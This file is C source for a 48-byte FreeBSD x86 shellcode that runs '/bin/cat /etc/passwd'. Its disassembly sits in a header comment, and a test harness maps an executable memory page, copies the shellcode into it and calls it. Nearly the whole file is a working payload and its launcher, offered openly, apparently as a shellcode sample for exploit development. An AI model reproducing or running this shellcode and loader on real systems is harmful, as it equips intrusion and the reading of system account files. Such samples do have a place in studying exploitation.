#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
# include <strings.h>
#endif

#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

/*
 * FreeBSD / x86 '/bin/cat /etc/passwd' 48 bytes shellcode
 *
 * Paulus Gandung Prakosa <gandung@lists.infradead.org>
 *
 * Tested on: FreeBSD freebsd 13.0-STABLE FreeBSD 13.0-STABLE #0 stable/13-n247853-74efe421ea0: Thu Oct 28 02:29:40 UTC 2021
 *            root@releng3.nyi.freebsd.org:/usr/obj/usr/src/amd64.amd64/sys/GENERIC  amd64
 *
 * Disassembly of section .text:
 *
 * 004010d4 <_start>:
 *  4010d4:	31 f6                	xor    %esi,%esi
 *  4010d6:	56                   	push   %esi
 *  4010d7:	68 2f 63 61 74       	push   $0x7461632f
 *  4010dc:	68 2f 62 69 6e       	push   $0x6e69622f
 *  4010e1:	89 e3                	mov    %esp,%ebx
 *  4010e3:	56                   	push   %esi
 *  4010e4:	68 73 73 77 64       	push   $0x64777373
 *  4010e9:	68 63 2f 70 61       	push   $0x61702f63
 *  4010ee:	68 2f 2f 65 74       	push   $0x74652f2f
 *  4010f3:	89 e1                	mov    %esp,%ecx
 *  4010f5:	56                   	push   %esi
 *  4010f6:	51                   	push   %ecx
 *  4010f7:	53                   	push   %ebx
 *  4010f8:	89 e2                	mov    %esp,%edx
 *  4010fa:	56                   	push   %esi
 *  4010fb:	52                   	push   %edx
 *  4010fc:	53                   	push   %ebx
 *  4010fd:	31 c0                	xor    %eax,%eax
 *  4010ff:	b0 3b                	mov    $0x3b,%al
 *  401101:	50                   	push   %eax
 *  401102:	cd 80                	int    $0x80
 */

#ifndef unused
# define unused(x) ((void)(x))
#endif

int main(int argc, char **argv)
{
	unused(argc);
	unused(argv);

	struct utsname uts;
	char *pcall;
	char *shellcode = "\x31\xf6\x56\x68\x2f\x63\x61\x74"
                          "\x68\x2f\x62\x69\x6e\x89\xe3\x56"
                          "\x68\x73\x73\x77\x64\x68\x63\x2f"
                          "\x70\x61\x68\x2f\x2f\x65\x74\x89"
                          "\xe1\x56\x51\x53\x89\xe2\x56\x52"
                          "\x53\x31\xc0\xb0\x3b\x50\xcd\x80";

	pcall = mmap(
		NULL,
		sysconf(_SC_PAGESIZE),
		PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_PRIVATE,
		-1,
		0
	);

	if (pcall == MAP_FAILED) {
		perror("mmap()");
		return -1;
	}

	bzero(&uts, sizeof(struct utsname));

	if (uname(&uts) < 0) {
		perror("uname()");
		munmap(pcall, sysconf(_SC_PAGESIZE));
		return -1;
	}

	printf("[*] Machine info\n");
	printf(" [*] sys: %s\n", uts.sysname);
	printf(" [*] node: %s\n", uts.nodename);
	printf(" [*] release: %s\n", uts.release);
	printf(" [*] version: %s\n", uts.version);
	printf(" [*] machine: %s\n", uts.machine);

	printf("[*] Copying shellcode into crafted buffer.\n");
	memcpy(pcall, shellcode, strlen(shellcode));

	printf("[*] Executing the shellcode..\n");
	__asm__ __volatile__(
		"call *%%eax\r\n"
		:
		: "a"(pcall)
	);

	printf("[*] Cleaning up..\n");
	munmap(pcall, sysconf(_SC_PAGESIZE));

	return 0;
}
